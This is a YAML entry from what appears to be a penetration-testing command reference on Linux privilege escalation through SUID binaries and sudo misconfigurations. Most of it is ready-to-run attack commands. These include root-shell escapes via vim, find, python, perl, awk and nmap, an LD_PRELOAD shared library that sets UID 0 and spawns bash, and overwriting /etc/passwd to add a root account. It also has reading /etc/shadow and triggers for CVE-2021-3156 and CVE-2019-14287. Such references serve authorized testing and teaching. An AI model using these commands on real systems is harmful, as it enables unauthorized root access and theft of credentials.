---
description: |
  Escalate privileges on Linux by abusing SUID binaries and sudo misconfigurations. Always check GTFOBins for exploitation techniques.
commands:
  - have: Shell
    cmd: |
      # ============================================================
      # ENUMERATION — Sudo permissions
      # ============================================================

      # Check sudo permissions for current user
      sudo -l

      # Check sudo version (older versions have CVEs)
      sudo --version

      # ============================================================
      # ENUMERATION — SUID and SGID binaries
      # ============================================================

      # Find all SUID binaries
      find / -perm -4000 2>/dev/null

      # Find SUID binaries (filter out common false positives)
      find / -perm -4000 2>/dev/null | grep -vE "snap|lib|dbus|Xorg"

      # Find all SGID binaries
      find / -perm -2000 2>/dev/null

      # Check GTFOBins for each binary found:
      # https://gtfobins.github.io/

      # ============================================================
      # SUDO EXPLOITS — Common sudo-allowed binaries
      # ============================================================

      # sudo vim — spawn shell
      sudo vim -c ':!/bin/bash'

      # sudo find — command execution
      sudo find / -exec /bin/bash \; -quit

      # sudo python3
      sudo python3 -c 'import os; os.system("/bin/bash")'

      # sudo perl
      sudo perl -e 'exec "/bin/bash";'

      # sudo env
      sudo env /bin/bash

      # sudo awk
      sudo awk 'BEGIN {system("/bin/bash")}'

      # sudo less/more — type !/bin/bash in the pager
      sudo less /etc/shadow

      # sudo nmap (older versions with interactive mode)
      sudo nmap --interactive
      # then type: !sh

      # ============================================================
      # SUDO — LD_PRELOAD exploitation
      # ============================================================

      # If sudo -l shows: env_keep += LD_PRELOAD
      # Compile a shared library that spawns a shell:
      # #include <stdio.h>
      # #include <stdlib.h>
      # void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("/bin/bash -p"); }
      gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
      sudo LD_PRELOAD=/tmp/preload.so <any_allowed_command>

      # ============================================================
      # SUID EXPLOITS — Common SUID binaries
      # ============================================================

      # SUID bash/sh — drop into root shell
      /bin/bash -p

      # SUID python3
      python3 -c 'import os; os.execvp("/bin/bash", ["bash", "-p"])'

      # SUID find
      find . -exec /bin/bash -p \; -quit

      # SUID cp — overwrite /etc/passwd
      openssl passwd -1 hacker
      # Add line: hacker:<hash>:0:0:root:/root:/bin/bash to /tmp/passwd
      cp /tmp/passwd /etc/passwd

      # SUID nmap (older versions)
      nmap --interactive
      # then type: !sh

      # ============================================================
      # SUDO VERSION CVEs
      # ============================================================

      # CVE-2021-3156 (Baron Samedit) — sudo 1.8.2 to 1.8.31p2, 1.9.0 to 1.9.5p1
      # https://github.com/blasty/CVE-2021-3156
      sudoedit -s '\' $(python3 -c 'print("A"*1000)')

      # CVE-2019-14287 — sudo < 1.8.28 (run as any user bypass)
      # If sudo -l shows: (ALL, !root) /bin/bash
      sudo -u#-1 /bin/bash
phase:
  - PrivEsc
target_os:
  - Linux
services: []
techniques:
  - SUID_Abuse
  - Sudo_Abuse
references:
  - https://gtfobins.github.io/
  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
---
